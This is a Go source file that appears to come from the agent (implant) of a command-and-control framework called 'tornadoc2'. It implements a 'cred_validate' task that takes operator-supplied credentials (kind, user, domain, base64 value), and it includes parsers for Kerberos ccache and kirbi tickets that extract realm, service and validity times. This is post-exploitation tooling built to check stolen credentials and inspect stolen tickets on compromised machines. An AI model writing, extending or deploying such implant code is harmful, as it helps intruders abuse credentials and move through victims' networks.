package core

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
	"time"

	"tornadoc2/agent/protocol"
)

func (a *Agent) credValidateVerb(ctx context.Context,
	t protocol.Task) protocol.Result {

	if len(t.Args) < 4 {
		return credValidateError(t.ID,
			"cred_validate requires kind, user, domain, value")
	}

	kind := strings.ToLower(t.Args[0])
	user := t.Args[1]
	domain := t.Args[2]

	value, err := base64.StdEncoding.DecodeString(t.Args[3])
	if err != nil {
		return credValidateError(t.ID,
			"invalid base64 in value argument")
	}

	target := ""
	if len(t.Args) > 4 {
		target = t.Args[4]
	}

	status, detail := credValidateDispatch(
		ctx, kind, user, domain, string(value), target)

	out := fmt.Sprintf(`{"status":%q,"detail":%q}`,
		status, detail)
	return protocol.Result{ID: t.ID,
		Output: encodeOutput([]byte(out))}
}

func credValidateError(id, msg string) protocol.Result {
	out := fmt.Sprintf(`{"status":"error","detail":%q}`, msg)
	return protocol.Result{ID: id,
		Output: encodeOutput([]byte(out))}
}

type ticketInfo struct {
	Format    string
	Realm     string
	Server    string
	StartTime time.Time
	EndTime   time.Time
	HasTimes  bool
	Note      string
}

func parseTicket(raw []byte) (ticketInfo, error) {
	if len(raw) < 4 {
		return ticketInfo{}, errors.New("ticket too short")
	}
	if raw[0] == 0x05 && raw[1] == 0x04 {
		return parseCcache(raw)
	}
	if raw[0] == 0x76 {
		return parseKirbi(raw)
	}
	return ticketInfo{}, errors.New(
		"unrecognised ticket format (expected ccache 0x05 0x04 " +
			"or kirbi 0x76)")
}

type ccacheReader struct {
	data []byte
	pos  int
}

func (r *ccacheReader) u8() (byte, error) {
	if r.pos+1 > len(r.data) {
		return 0, errors.New("ccache: short read")
	}
	v := r.data[r.pos]
	r.pos++
	return v, nil
}

func (r *ccacheReader) u16() (uint16, error) {
	if r.pos+2 > len(r.data) {
		return 0, errors.New("ccache: short read")
	}
	v := uint16(r.data[r.pos])<<8 | uint16(r.data[r.pos+1])
	r.pos += 2
	return v, nil
}

func (r *ccacheReader) u32() (uint32, error) {
	if r.pos+4 > len(r.data) {
		return 0, errors.New("ccache: short read")
	}
	v := uint32(r.data[r.pos])<<24 | uint32(r.data[r.pos+1])<<16 |
		uint32(r.data[r.pos+2])<<8 | uint32(r.data[r.pos+3])
	r.pos += 4
	return v, nil
}

func (r *ccacheReader) take(n int) ([]byte, error) {
	if n < 0 || r.pos+n > len(r.data) {
		return nil, errors.New("ccache: short read")
	}
	v := r.data[r.pos : r.pos+n]
	r.pos += n
	return v, nil
}

func (r *ccacheReader) str() (string, error) {
	n, err := r.u32()
	if err != nil {
		return "", err
	}
	if n > 4096 {
		return "", errors.New("ccache: string too long")
	}
	b, err := r.take(int(n))
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func (r *ccacheReader) principal(withNameType bool) (string, error) {
	if withNameType {
		if _, err := r.u32(); err != nil {
			return "", err
		}
	}
	count, err := r.u32()
	if err != nil {
		return "", err
	}
	if count > 32 {
		return "", errors.New("ccache: implausible principal")
	}
	parts := make([]string, 0, count)
	for i := uint32(0); i < count; i++ {
		p, err := r.str()
		if err != nil {
			return "", err
		}
		parts = append(parts, p)
	}
	return strings.Join(parts, "/"), nil
}

func parseCcache(raw []byte) (ticketInfo, error) {
	r := &ccacheReader{data: raw}
	if _, err := r.u8(); err != nil {
		return ticketInfo{}, err
	}
	if _, err := r.u8(); err != nil {
		return ticketInfo{}, err
	}
	hdrLen, err := r.u16()
	if err != nil {
		return ticketInfo{}, err
	}
	if _, err := r.take(int(hdrLen)); err != nil {
		return ticketInfo{}, err
	}
	if _, err := r.principal(true); err != nil {
		return ticketInfo{}, err
	}
	sname, err := r.principal(false)
	if err != nil {
		return ticketInfo{}, err
	}
	realm, err := r.str()
	if err != nil {
		return ticketInfo{}, err
	}
	if _, err := r.u16(); err != nil {
		return ticketInfo{}, err
	}
	if _, err := r.str(); err != nil {
		return ticketInfo{}, err
	}
	if _, err := r.str(); err != nil {
		return ticketInfo{}, err
	}
	auth, err := r.u32()
	if err != nil {
		return ticketInfo{}, err
	}
	start, err := r.u32()
	if err != nil {
		return ticketInfo{}, err
	}
	end, err := r.u32()
	if err != nil {
		return ticketInfo{}, err
	}
	renew, err := r.u32()
	if err != nil {
		return ticketInfo{}, err
	}
	_ = auth
	_ = renew
	return ticketInfo{
		Format:    "ccache",
		Realm:     realm,
		Server:    sname,
		StartTime: time.Unix(int64(start), 0),
		EndTime:   time.Unix(int64(end), 0),
		HasTimes:  true,
	}, nil
}

type derReader struct {
	data []byte
	pos  int
}

func (r *derReader) readTLV() (byte, []byte, error) {
	if r.pos >= len(r.data) {
		return 0, nil, errors.New("der: end of data")
	}
	tag := r.data[r.pos]
	r.pos++
	if r.pos >= len(r.data) {
		return 0, nil, errors.New("der: truncated length")
	}
	length := int(r.data[r.pos])
	r.pos++
	if length&0x80 != 0 {
		n := length & 0x7F
		if n > 4 || r.pos+n > len(r.data) {
			return 0, nil, errors.New("der: bad long length")
		}
		length = 0
		for i := 0; i < n; i++ {
			length = length<<8 | int(r.data[r.pos])
			r.pos++
		}
	}
	if r.pos+length > len(r.data) {
		return 0, nil, errors.New("der: truncated value")
	}
	value := r.data[r.pos : r.pos+length]
	r.pos += length
	return tag, value, nil
}

func parseKirbi(raw []byte) (ticketInfo, error) {
	r := &derReader{data: raw}
	tag, body, err := r.readTLV()
	if err != nil {
		return ticketInfo{}, err
	}
	if tag != 0x76 {
		return ticketInfo{}, fmt.Errorf(
			"kirbi: expected tag 0x76, got 0x%02X", tag)
	}
	// Walk [0] pvno, [1] msg-type, [2] tickets.
	inner := &derReader{data: body}
	var firstTicket []byte
	for inner.pos < len(inner.data) {
		t, v, err := inner.readTLV()
		if err != nil {
			break
		}
		if t == 0xA2 {
			tickets := &derReader{data: v}
			_, tv, err := tickets.readTLV()
			if err == nil {
				firstTicket = tv
			}
			break
		}
	}
	if firstTicket == nil {
		return ticketInfo{}, errors.New("kirbi: no ticket in envelope")
	}
	// Ticket: [0] tkt-vno, [1] realm, [2] sname, [3] enc-part.
	treal := &derReader{data: firstTicket}
	var realm, sname string
	for treal.pos < len(treal.data) {
		t, v, err := treal.readTLV()
		if err != nil {
			break
		}
		switch t {
		case 0xA1:
			realm = string(v)
		case 0xA2:
			pn := &derReader{data: v}
			for pn.pos < len(pn.data) {
				pt, pv, err := pn.readTLV()
				if err != nil {
					break
				}
				if pt == 0xA1 {
					ns := &derReader{data: pv}
					var parts []string
					for ns.pos < len(ns.data) {
						_, sv, err := ns.readTLV()
						if err != nil {
							break
						}
						parts = append(parts, string(sv))
					}
					sname = strings.Join(parts, "/")
				}
			}
		}
	}
	return ticketInfo{
		Format: "kirbi",
		Realm:  realm,
		Server: sname,
		Note:   "envelope only; expiry requires the KDC key",
	}, nil
}